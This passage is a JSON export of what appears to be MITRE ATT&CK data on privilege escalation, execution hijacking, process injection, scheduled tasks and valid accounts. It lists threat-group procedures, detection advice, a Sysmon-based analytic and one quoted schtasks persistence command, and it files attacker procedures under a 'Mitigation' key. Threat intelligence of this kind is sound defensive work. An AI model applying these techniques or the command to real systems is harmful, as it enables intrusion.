        "description": "InvisiMole has exploited CVE-2007-5633 vulnerability in the speedfan.sys driver to obtain kernel mode privileges.[1]"
      },
      {
        "id": "S0044",
        "name": "JHUHUGIT",
        "description": "JHUHUGIT has exploited CVE-2015-1701 and CVE-2015-2387 to escalate privileges.[23][24]"
      },
      {
        "id": "G1004",
        "name": "LAPSUS$",
        "description": "LAPSUS$ has exploited unpatched vulnerabilities on internally accessible servers including JIRA, GitLab, and Confluence for privilege escalation.[25]"
      },
      {
        "id": "G1019",
        "name": "MoustachedBouncer",
        "description": "MoustachedBouncer has exploited CVE-2021-1732 to execute malware components with elevated rights.[26]"
      },
      {
        "id": "S0664",
        "name": "Pandora",
        "description": "Pandora can use CVE-2017-15303 to bypass Windows Driver Signature Enforcement (DSE) protection and load its driver.[27]"
      },
      {
        "id": "G0068",
        "name": "PLATINUM",
        "description": "PLATINUM has leveraged a zero-day vulnerability to escalate privileges.[28]"
      },
      {
        "id": "S0378",
        "name": "PoshC2",
        "description": "PoshC2 contains modules for local privilege escalation exploits such as CVE-2016-9192 and CVE-2016-0099.[29]"
      },
      {
        "id": "S0654",
        "name": "ProLock",
        "description": "ProLock can use CVE-2019-0859 to escalate privileges on a compromised host.[30]"
      },
      {
        "id": "S0125",
        "name": "Remsec",
        "description": "Remsec has a plugin to drop and execute vulnerable Outpost Sandbox or avast! Virtualization drivers in order to gain kernel mode privileges.[31]"
      },
      {
        "id": "G1015",
        "name": "Scattered Spider",
        "description": "Scattered Spider has deployed a malicious kernel driver through exploitation of CVE-2015-2291 in the Intel Ethernet diagnostics driver for Windows (iqvw64.sys).[32]"
      },
      {
        "id": "S0623",
        "name": "Siloscape",
        "description": "Siloscape has leveraged a vulnerability in Windows containers to perform an Escape to Host.[33]"
      },
      {
        "id": "S0603",
        "name": "Stuxnet",
        "description": "Stuxnet used MS10-073 and an undisclosed Task Scheduler vulnerability to escalate privileges on local Windows machines.[34]"
      },
      {
        "id": "G0027",
        "name": "Threat Group-3390",
        "description": "Threat Group-3390 has used CVE-2014-6324 and CVE-2017-0213 to escalate privileges.[35][36]"
      },
      {
        "id": "G0131",
        "name": "Tonto Team",
        "description": "Tonto Team has exploited CVE-2019-0803 and MS16-032 to escalate privileges.[37]"
      },
      {
        "id": "G0010",
        "name": "Turla",
        "description": "Turla has exploited vulnerabilities in the VBoxDrv.sys driver to obtain kernel mode privileges.[2]"
      },
      {
        "id": "G0107",
        "name": "Whitefly",
        "description": "Whitefly has used an open-source tool to exploit a known Windows privilege escalation vulnerability (CVE-2016-0051) on unpatched computers.[38]"
      },
      {
        "id": "S0176",
        "name": "Wingbird",
        "description": "Wingbird exploits CVE-2016-4117 to allow an executable to gain escalated privileges.[39]"
      },
      {
        "id": "S0658",
        "name": "XCSSET",
        "description": "XCSSET has used a zero-day exploit in the ssh launchdaemon to elevate privileges and bypass SIP.[40]"
      },
      {
        "id": "G0128",
        "name": "ZIRCONIUM",
        "description": "ZIRCONIUM has exploited CVE-2017-0005 for local privilege escalation.[41]"
      },
      {
        "id": "S0672",
        "name": "Zox",
        "description": "Zox has the ability to leverage local and remote exploits to escalate privileges.[42]"
      }
    ],
    "Detection": [
      {
        "id": "DS0027",
        "dsource": "Driver",
        "dcomp": "Driver Load",
        "detects": "Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the processes. This could include suspicious files written to disk, evidence of Process Injection for attempts to hide execution or evidence of Discovery. Consider monitoring for the presence or loading (ex: Sysmon Event ID 6) of known vulnerable drivers that adversaries may drop and exploit to execute code in kernel mode.[44] Higher privileges are often necessary to perform additional actions such as some methods of OS Credential Dumping. Look for additional activity that may indicate an adversary has gained higher privileges."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes that may exploit software vulnerabilities in an attempt to elevate privileges.Note: Event IDs are for Sysmon (Event ID 1 - process create) and Windows Security Log (Event ID 4688 - a new process has been created). The Analytic is oriented around looking for an invocation of either spoolsv.exe or conhost.exe by a user, thus alerting us of any potentially malicious activity. A common way of escalating privileges in a system is by externally invoking and exploiting these executables, both of which are legitimate Windows applications.  Analytic 1 - Unusual Child Process for spoolsv.exe or connhost.exe  processes = filter processes where (  (event_id == \"1\" OR event_id == \"4688\") AND  (exe ==\"C:\\Windows\\System32\\spoolsv.exe\" OR    exe ==\"C:\\Windows\\System32\\conhost.exe\") AND   parent_image_path == \"C:\\Windows\\System32\\cmd.exe\")"
      }
    ],
    "Subtechniques": "\nPrivilege Escalation"
  },
  {
    "Title": "Hijack Execution Flow",
    "Code": "T1574",
    "Description": "Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.",
    "Mitigation": [
      {
        "id": "C0017",
        "name": "C0017",
        "description": "During C0017, APT41 established persistence by loading malicious libraries via modifications to the Import Address Table (IAT) within legitimate Microsoft binaries.[1]"
      },
      {
        "id": "S0354",
        "name": "Denis",
        "description": "Denis replaces the nonexistent Windows DLL \"msfte.dll\" with its own malicious version, which is loaded by the SearchIndexer.exe and SearchProtocolHost.exe.[2]"
      },
      {
        "id": "S0567",
        "name": "Dtrack",
        "description": "One of Dtrack can replace the normal flow of a program execution with malicious code.[3]"
      },
      {
        "id": "S0444",
        "name": "ShimRat",
        "description": "ShimRat can hijack the cryptbase.dll within migwiz.exe to escalate privileges and bypass UAC controls.[4]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may execute their own malicious payloads by hijacking the way operating systems run programs."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Creation",
        "detects": "Monitor for newly constructed files that may execute their own malicious payloads by hijacking the way operating systems run programs."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Modification",
        "detects": "Monitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Modifications to or creation of .manifest and .local redirection files that do not correlate with software updates are suspicious."
      },
      {
        "id": "DS0011",
        "dsource": "Module",
        "dcomp": "Module Load",
        "detects": "Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor processes for unusual activity (e.g., a process that does not use the network begins to do so, abnormal process call trees). Track library metadata, such as a hash, and compare libraries that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates."
      },
      {
        "id": "DS0019",
        "dsource": "Service",
        "dcomp": "Service Metadata",
        "detects": "Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data."
      },
      {
        "id": "DS0024",
        "dsource": "Windows Registry",
        "dcomp": "Windows Registry Key Modification",
        "detects": "Monitor for changes made to windows registry keys and/or values that may execute their own malicious payloads by hijacking the way operating systems run programs."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1574.001",
        "name": "DLL Search Order Hijacking"
      },
      {
        "id": "T1574.002",
        "name": "DLL Side-Loading"
      },
      {
        "id": "T1574.004",
        "name": "Dylib Hijacking"
      },
      {
        "id": "T1574.005",
        "name": "Executable Installer File Permissions Weakness"
      },
      {
        "id": "T1574.006",
        "name": "Dynamic Linker Hijacking"
      },
      {
        "id": "T1574.007",
        "name": "Path Interception by PATH Environment Variable"
      },
      {
        "id": "T1574.008",
        "name": "Path Interception by Search Order Hijacking"
      },
      {
        "id": "T1574.009",
        "name": "Path Interception by Unquoted Path"
      },
      {
        "id": "T1574.010",
        "name": "Services File Permissions Weakness"
      },
      {
        "id": "T1574.011",
        "name": "Services Registry Permissions Weakness"
      },
      {
        "id": "T1574.012",
        "name": "COR_PROFILER"
      },
      {
        "id": "T1574.013",
        "name": "KernelCallbackTable"
      }
    ],
    "Tactic": "Persistence, PrivilegeEscalation, DefenseEvasion"
  },
  {
    "Title": "Process Injection",
    "Code": "T1055",
    "Description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.",
    "Mitigation": [
      {
        "id": "C0028",
        "name": "2015 Ukraine Electric Power Attack",
        "description": "During the 2015 Ukraine Electric Power Attack, Sandworm Team loaded BlackEnergy into svchost.exe, which then launched iexplore.exe for their C2. [1]"
      },
      {
        "id": "S0469",
        "name": "ABK",
        "description": "ABK has the ability to inject shellcode into svchost.exe.[2]"
      },
      {
        "id": "S0331",
        "name": "Agent Tesla",
        "description": "Agent Tesla can inject into known, vulnerable binaries on targeted hosts.[3]"
      },
      {
        "id": "S1074",
        "name": "ANDROMEDA",
        "description": "ANDROMEDA can inject into the wuauclt.exe process to perform C2 actions.[4]"
      },
      {
        "id": "G0050",
        "name": "APT32",
        "description": "APT32 malware has injected a Cobalt Strike beacon into Rundll32.exe.[5]"
      },
      {
        "id": "G0067",
        "name": "APT37",
        "description": "APT37 injects its malware variant, ROKRAT, into the cmd.exe process.[6]"
      },
      {
        "id": "G0096",
        "name": "APT41",
        "description": "APT41 malware TIDYELF loaded the main WINTERLOVE component by injecting it into the iexplore.exe process.[7]"
      },
      {
        "id": "S0438",
        "name": "Attor",
        "description": "Attor's dispatcher can inject itself into running processes to gain higher privileges and to evade detection.[8]"
      },
      {
        "id": "S0347",
        "name": "AuditCred",
        "description": "AuditCred can inject code from files to other running processes.[9]"
      },
      {
        "id": "S0473",
        "name": "Avenger",
        "description": "Avenger has the ability to inject shellcode into svchost.exe.[2]"
      },
      {
        "id": "S0093",
        "name": "Backdoor.Oldrea",
        "description": "Backdoor.Oldrea injects itself into explorer.exe.[10][11]"
      },
      {
        "id": "S1081",
        "name": "BADHATCH",
        "description": "BADHATCH can inject itself into an existing explorer.exe process by using RtlCreateUserThread.[12][13]"
      },
      {
        "id": "S0534",
        "name": "Bazar",
        "description": "Bazar can inject code through calling VirtualAllocExNuma.[14]"
      },
      {
        "id": "S0470",
        "name": "BBK",
        "description": "BBK has the ability to inject shellcode into svchost.exe.[2]"
      },
      {
        "id": "S1039",
        "name": "Bumblebee",
        "description": "Bumblebee can inject code into multiple processes on infected endpoints.[15]"
      },
      {
        "id": "S0348",
        "name": "Cardinal RAT",
        "description": "Cardinal RAT injects into a newly spawned process created from a native Windows executable.[16]"
      },
      {
        "id": "S0660",
        "name": "Clambling",
        "description": "Clambling can inject into the svchost.exe process for execution.[17]"
      },
      {
        "id": "G0080",
        "name": "Cobalt Group",
        "description": "Cobalt Group has injected code into trusted processes.[18]"
      },
      {
        "id": "S0154",
        "name": "Cobalt Strike",
        "description": "Cobalt Strike can inject a variety of payloads into processes dynamically chosen by the adversary.[19][20][21]"
      },
      {
        "id": "S0614",
        "name": "CostaBricks",
        "description": "CostaBricks can inject a payload into the memory of a compromised host.[22]"
      },
      {
        "id": "S0695",
        "name": "Donut",
        "description": "Donut includes a subproject DonutTest to inject shellcode into a target process.[23]"
      },
      {
        "id": "S0024",
        "name": "Dyre",
        "description": "Dyre has the ability to directly inject its code into the web browser process.[24]"
      },
      {
        "id": "S0554",
        "name": "Egregor",
        "description": "Egregor can inject its payload into iexplore.exe process.[25]"
      },
      {
        "id": "S0363",
        "name": "Empire",
        "description": "Empire contains multiple modules for injecting into processes, such as Invoke-PSInject.[26]"
      },
      {
        "id": "S0168",
        "name": "Gazer",
        "description": "Gazer injects its communication module into an Internet accessible process through which it performs C2.[27][28]"
      },
      {
        "id": "S0032",
        "name": "gh0st RAT",
        "description": "gh0st RAT can inject malicious code into process created by the \"Command_Create&Inject\" function.[29]"
      },
      {
        "id": "S0561",
        "name": "GuLoader",
        "description": "GuLoader has the ability to inject shellcode into a donor processes that is started in a suspended state. GuLoader has previously used RegAsm as a donor process.[30]"
      },
      {
        "id": "S0376",
        "name": "HOPLIGHT",
        "description": "HOPLIGHT has injected into running processes.[31]"
      },
      {
        "id": "S0040",
        "name": "HTRAN",
        "description": "HTRAN can inject into into running processes.[32]"
      },
      {
        "id": "S0398",
        "name": "HyperBro",
        "description": "HyperBro can run shellcode it injects into a newly created process.[33]"
      },
      {
        "id": "S0260",
        "name": "InvisiMole",
        "description": "InvisiMole can inject itself into another process to avoid detection including use of a technique called ListPlanting that customizes the sorting algorithm in a ListView structure.[34]"
      },
      {
        "id": "S0581",
        "name": "IronNetInjector",
        "description": "IronNetInjector can use an IronPython scripts to load a .NET injector to inject a payload into its own or a remote process.[35]"
      },
      {
        "id": "S0044",
        "name": "JHUHUGIT",
        "description": "JHUHUGIT performs code injection injecting its own functions to browser processes.[36][37]"
      },
      {
        "id": "S0201",
        "name": "JPIN",
        "description": "JPIN can inject content into lsass.exe to load a module.[38]"
      },
      {
        "id": "G0094",
        "name": "Kimsuky",
        "description": "Kimsuky has used Win7Elevate to inject malicious code into explorer.exe.[39]"
      },
      {
        "id": "S0681",
        "name": "Lizar",
        "description": "Lizar can migrate the loader into another process.[40]"
      },
      {
        "id": "S1059",
        "name": "metaMain",
        "description": "metaMain can inject the loader file, Speech02.db, into a process.[41]"
      },
      {
        "id": "S0084",
        "name": "Mis-Type",
        "description": "Mis-Type has been injected directly into a running process, including explorer.exe.[42]"
      },
      {
        "id": "S0247",
        "name": "NavRAT",
        "description": "NavRAT copies itself into a running Internet Explorer process to evade detection.[43]"
      },
      {
        "id": "S0198",
        "name": "NETWIRE",
        "description": "NETWIRE can inject code into system processes including notepad.exe, svchost.exe, and vbc.exe.[44]"
      },
      {
        "id": "C0013",
        "name": "Operation Sharpshooter",
        "description": "During Operation Sharpshooter, threat actors leveraged embedded shellcode to inject a downloader into the memory of Word.[45]"
      },
      {
        "id": "C0014",
        "name": "Operation Wocao",
        "description": "During Operation Wocao, threat actors injected code into a selected process, which in turn launches a command as a child process of the original.[46]"
      },
      {
        "id": "S0664",
        "name": "Pandora",
        "description": "Pandora can start and inject code into a new svchost process.[47]"
      },
      {
        "id": "S1050",
        "name": "PcShare",
        "description": "The PcShare payload has been injected into the logagent.exe and rdpclip.exe processes.[48]"
      },
      {
        "id": "G0068",
        "name": "PLATINUM",
        "description": "PLATINUM has used various methods of process injection including hot patching.[38]"
      },
      {
        "id": "S0378",
        "name": "PoshC2",
        "description": "PoshC2 contains multiple modules for injecting into processes, such as Invoke-PSInject.[49]"
      },
      {
        "id": "S0650",
        "name": "QakBot",
        "description": "QakBot can inject itself into processes including explore.exe, Iexplore.exe, Mobsync.exe., and wermgr.exe.[50][51][52][53][54]"
      },
      {
        "id": "S0332",
        "name": "Remcos",
        "description": "Remcos has a command to hide itself through injecting into another process.[55]"
      },
      {
        "id": "S0496",
        "name": "REvil",
        "description": "REvil can inject itself into running processes on a compromised host.[56]"
      },
      {
        "id": "S0240",
        "name": "ROKRAT",
        "description": "ROKRAT can use VirtualAlloc, WriteProcessMemory, and then CreateRemoteThread to execute shellcode within the address space of Notepad.exe.[57]"
      },
      {
        "id": "S0446",
        "name": "Ryuk",
        "description": "Ryuk has injected itself into remote processes to encrypt files using a combination of VirtualAlloc, WriteProcessMemory, and CreateRemoteThread.[58]"
      },
      {
        "id": "S0596",
        "name": "ShadowPad",
        "description": "ShadowPad has injected an install module into a newly created process.[59]"
      },
      {
        "id": "G0091",
        "name": "Silence",
        "description": "Silence has injected a DLL library containing a Trojan into the fwmain32.exe process.[60]"
      },
      {
        "id": "S0692",
        "name": "SILENTTRINITY",
        "description": "SILENTTRINITY can inject shellcode directly into Excel.exe or a specific process.[61]"
      },
      {
        "id": "S0633",
        "name": "Sliver",
        "description": "Sliver can inject code into local and remote processes.[62][63]"
      },
      {
        "id": "S0533",
        "name": "SLOTHFULMEDIA",
        "description": "SLOTHFULMEDIA can inject into running processes on a compromised host.[64]"
      },
      {
        "id": "S0226",
        "name": "Smoke Loader",
        "description": "Smoke Loader injects into the Internet Explorer process.[65]"
      },
      {
        "id": "S0380",
        "name": "StoneDrill",
        "description": "StoneDrill has relied on injecting its payload directly into the process memory of the victim's preferred browser.[66]"
      },
      {
        "id": "G1018",
        "name": "TA2541",
        "description": "TA2541 has injected malicious code into legitimate .NET related processes including  regsvcs.exe, msbuild.exe, and installutil.exe.[67][68]"
      },
      {
        "id": "S0266",
        "name": "TrickBot",
        "description": "TrickBot has used Nt* Native API functions to inject code into legitimate processes such as wermgr.exe.[69]"
      },
      {
        "id": "S0436",
        "name": "TSCookie",
        "description": "TSCookie has the ability to inject code into the svchost.exe, iexplorer.exe, explorer.exe, and default browser processes.[70]"
      },
      {
        "id": "G0010",
        "name": "Turla",
        "description": "Turla has also used PowerSploit's Invoke-ReflectivePEInjection.ps1 to reflectively load a PowerShell payload into a random process on the victim system.[71]"
      },
      {
        "id": "S0670",
        "name": "WarzoneRAT",
        "description": "WarzoneRAT has the ability to inject malicious DLLs into a specific process for privilege escalation.[72]"
      },
      {
        "id": "S0579",
        "name": "Waterbear",
        "description": "Waterbear can inject decrypted shellcode into the LanmanServer service.[73]"
      },
      {
        "id": "S0206",
        "name": "Wiarp",
        "description": "Wiarp creates a backdoor through which remote attackers can inject files into running processes.[74]"
      },
      {
        "id": "S0176",
        "name": "Wingbird",
        "description": "Wingbird performs multiple process injections to hijack system processes and execute malicious code.[75]"
      },
      {
        "id": "G0102",
        "name": "Wizard Spider",
        "description": "Wizard Spider has used process injection to execute payloads to escalate privileges.[76]"
      },
      {
        "id": "S1065",
        "name": "Woody RAT",
        "description": "Woody RAT can inject code into a targeted process by writing to the remote memory of an infected system and then create a remote thread.[77]"
      }
    ],
    "Detection": [
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Metadata",
        "detects": "Monitor for contextual data about a file, which may include information such as name, the content (ex: signature, headers, or data/media), user/owner, permissions, etc."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Modification",
        "detects": "Monitor for changes made to files that may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges."
      },
      {
        "id": "DS0011",
        "dsource": "Module",
        "dcomp": "Module Load",
        "detects": "Monitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as CreateRemoteThread, SuspendThread/SetThreadContext/ResumeThread, QueueUserAPC/NtQueueApcThread, and those that can be used to modify memory within another process, such as VirtualAllocEx/WriteProcessMemory, may be used for this technique.[79] Monitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.[80] [81] [82] [83]"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Access",
        "detects": "Monitor for processes being viewed that may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Metadata",
        "detects": "Monitor for process memory inconsistencies, such as checking memory ranges against a known copy of the legitimate module.[84]"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Modification",
        "detects": "Monitor for changes made to processes that may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1055.001",
        "name": "Dynamic-link Library Injection"
      },
      {
        "id": "T1055.002",
        "name": "Portable Executable Injection"
      },
      {
        "id": "T1055.003",
        "name": "Thread Execution Hijacking"
      },
      {
        "id": "T1055.004",
        "name": "Asynchronous Procedure Call"
      },
      {
        "id": "T1055.005",
        "name": "Thread Local Storage"
      },
      {
        "id": "T1055.008",
        "name": "Ptrace System Calls"
      },
      {
        "id": "T1055.009",
        "name": "Proc Memory"
      },
      {
        "id": "T1055.011",
        "name": "Extra Window Memory Injection"
      },
      {
        "id": "T1055.012",
        "name": "Process Hollowing"
      },
      {
        "id": "T1055.013",
        "name": "Process Doppelgänging"
      },
      {
        "id": "T1055.014",
        "name": "VDSO Hijacking"
      },
      {
        "id": "T1055.015",
        "name": "ListPlanting"
      }
    ],
    "Tactic": "DefenseEvasion, PrivilegeEscalation"
  },
  {
    "Title": "Scheduled Task/Job",
    "Code": "T1053",
    "Description": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.[1]Adversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to System Binary Proxy Execution, adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.[2]",
    "Mitigation": [
      {
        "id": "S1052",
        "name": "DEADEYE",
        "description": "DEADEYE has used the scheduled tasks \\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor, \\Microsoft\\Windows\\Ras\\ManagerMobility, \\Microsoft\\Windows\\WDI\\SrvSetupResults, and \\Microsoft\\Windows\\WDI\\USOShared to establish persistence.[3]"
      },
      {
        "id": "G1006",
        "name": "Earth Lusca",
        "description": "Earth Lusca used the command schtasks /Create /SC ONLOgon /TN WindowsUpdateCheck /TR \"[file path]\" /ru system for persistence.[4]"
      },
      {
        "id": "S0447",
        "name": "Lokibot",
        "description": "Lokibot's second stage DLL has set a timer using \"timeSetEvent\" to schedule its next execution.[5]"
      },
      {
        "id": "S0125",
        "name": "Remsec",
        "description": "Remsec schedules the execution one of its modules by creating a new scheduler task.[6]"
      },
      {
        "id": "S1034",
        "name": "StrifeWater",
        "description": "StrifeWater has create a scheduled task named Mozilla\\Firefox Default Browser Agent 409046Z0FF4A39CB for persistence.[7]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code."
      },
      {
        "id": "DS0032",
        "dsource": "Container",
        "dcomp": "Container Creation",
        "detects": "Monitor for newly constructed containers that may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Creation",
        "detects": "Monitor newly constructed files that may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Modification",
        "detects": "Monitor for changes made to files that may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes that may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code."
      },
      {
        "id": "DS0003",
        "dsource": "Scheduled Job",
        "dcomp": "Scheduled Job Creation",
        "detects": "Monitor newly constructed scheduled jobs that may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1053.002",
        "name": "At"
      },
      {
        "id": "T1053.003",
        "name": "Cron"
      },
      {
        "id": "T1053.005",
        "name": "Scheduled Task"
      },
      {
        "id": "T1053.006",
        "name": "Systemd Timers"
      },
      {
        "id": "T1053.007",
        "name": "Container Orchestration Job"
      }
    ],
    "Tactic": "Execution, Persistence, PrivilegeEscalation"
  },
  {
    "Title": "Valid Accounts",
    "Code": "T1078",
    "Description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.[1] Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.[2]The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.[3]",
    "Mitigation": [
      {
        "id": "C0028",
        "name": "2015 Ukraine Electric Power Attack",
        "description": "During the 2015 Ukraine Electric Power Attack, Sandworm Team used valid accounts on the corporate network to escalate privileges, move laterally, and establish persistence within the corporate network. [4]"
      },
      {
        "id": "G0026",
        "name": "APT18",
        "description": "APT18 actors leverage legitimate credentials to log into external remote services.[5]"
      },
      {
        "id": "G0007",
        "name": "APT28",
        "description": "APT28 has used legitimate credentials to gain initial access, maintain access, and exfiltrate data from a victim network. The group has specifically used credentials stolen through a spearphishing email to login to the DCCC network. The group has also leveraged default manufacturer's passwords to gain initial access to corporate networks via IoT devices such as a VOIP phone, printer, and video decoder.[6][7][8][9]"
      },
      {
        "id": "G0016",
        "name": "APT29",
        "description": "APT29 has used a compromised account to access an organization's VPN infrastructure.[10]"
      },
      {
        "id": "G0064",
        "name": "APT33",
        "description": "APT33 has used valid accounts for initial access and privilege escalation.[11][12]"
      },
      {
        "id": "G0087",
        "name": "APT39",
        "description": "APT39 has used stolen credentials to compromise Outlook Web Access (OWA).[13]"
      },
      {
        "id": "G0096",
        "name": "APT41",
        "description": "APT41 used compromised credentials to log on to other systems.[14][15]"
      },
      {
        "id": "G0001",
        "name": "Axiom",
        "description": "Axiom has used previously compromised administrative accounts to escalate privileges.[16]"
      },
      {
        "id": "G0008",
        "name": "Carbanak",
        "description": "Carbanak actors used legitimate credentials of banking employees to perform operations that sent them millions of dollars.[17]"
      },
      {
        "id": "G0114",
        "name": "Chimera",
        "description": "Chimera has used a valid account to maintain persistence via scheduled task.[18]"
      },
      {
        "id": "G0035",
        "name": "Dragonfly",
        "description": "Dragonfly has compromised user credentials and used valid accounts for operations.[19][20][21]"
      },
      {
        "id": "S0567",
        "name": "Dtrack",
        "description": "Dtrack used hard-coded credentials to gain access to a network share.[22]"
      },
      {
        "id": "S0038",
        "name": "Duqu",
        "description": "Adversaries can instruct Duqu to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware.[23]"
      },
      {
        "id": "G0051",
        "name": "FIN10",
        "description": "FIN10 has used stolen credentials to connect remotely to victim networks using VPNs protected with only a single factor.[24]"
      },
      {
        "id": "G0085",
        "name": "FIN4",
        "description": "FIN4 has used legitimate credentials to hijack email communications.[25][26]"
      },
      {
        "id": "G0053",
        "name": "FIN5",
        "description": "FIN5 has used legitimate VPN, RDP, Citrix, or VNC credentials to maintain access to a victim environment.[27][28][29]"
      },
      {
        "id": "G0037",
        "name": "FIN6",
        "description": "To move laterally on a victim network, FIN6 has used credentials stolen from various systems on which it gathered usernames and password hashes.[30][31][32]"
      },
      {
        "id": "G0046",
        "name": "FIN7",
        "description": "FIN7 has harvested valid administrative credentials for lateral movement.[33]"
      },
      {
        "id": "G0061",
        "name": "FIN8",
        "description": "FIN8 has used valid accounts for persistence and lateral movement.[34]"
      },
      {
        "id": "G0117",
        "name": "Fox Kitten",
        "description": "Fox Kitten has used valid credentials with various services during lateral movement.[35]"
      },
      {
        "id": "G0093",
        "name": "GALLIUM",
        "description": "GALLIUM leveraged valid accounts to maintain access to a victim network.[36]"
      },
      {
        "id": "S0604",
        "name": "Industroyer",
        "description": "Industroyer can use supplied user credentials to execute processes and stop services.[37]"
      },
      {
        "id": "G0004",
        "name": "Ke3chang",
        "description": "Ke3chang has used credential dumpers or stealers to obtain legitimate credentials, which they used to gain access to victim accounts.[38]"
      },
      {
        "id": "S0599",
        "name": "Kinsing",
        "description": "Kinsing has used valid SSH credentials to access remote hosts.[39]"
      },
      {
        "id": "G1004",
        "name": "LAPSUS$",
        "description": "LAPSUS$ has used compromised credentials and/or session tokens to gain access into a victim's VPN, VDI, RDP, and IAMs.[40][41]"
      },
      {
        "id": "G0032",
        "name": "Lazarus Group",
        "description": "Lazarus Group has used administrator credentials to gain access to restricted network segments.[42]"
      },
      {
        "id": "G0065",
        "name": "Leviathan",
        "description": "Leviathan has obtained valid accounts to gain initial access.[43][44]"
      },
      {
        "id": "S0362",
        "name": "Linux Rabbit",
        "description": "Linux Rabbit acquires valid SSH accounts through brute force. [45]"
      },
      {
        "id": "G0045",
        "name": "menuPass",
        "description": "menuPass has used valid accounts including shared between Managed Service Providers and clients to move between the two environments.[46][47][48][49]"
      },
      {
        "id": "C0002",
        "name": "Night Dragon",
        "description": "During Night Dragon, threat actors used compromised VPN accounts to gain access to victim systems.[50]"
      },
      {
        "id": "G0049",
        "name": "OilRig",
        "description": "OilRig has used compromised credentials to access other systems on a victim network.[51][52][15]"
      },
      {
        "id": "C0014",
        "name": "Operation Wocao",
